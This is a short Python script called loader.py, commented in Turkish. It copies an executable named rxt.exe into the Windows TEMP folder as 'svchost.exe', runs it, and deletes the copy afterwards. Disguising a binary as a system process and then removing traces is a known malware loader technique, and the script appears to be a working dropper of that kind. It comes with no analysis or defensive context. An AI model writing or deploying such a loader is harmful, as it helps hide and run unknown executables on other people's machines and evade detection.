# loader.py
import os, subprocess, shutil, time

# Exe'yi kopyala ve çalıştır
tmp = os.path.join(os.environ.get('TEMP'), 'svchost.exe')
shutil.copy2('rxt.exe', tmp)
subprocess.Popen(tmp, shell=True)
time.sleep(10)

try:
    os.remove(tmp)
except:
    pass
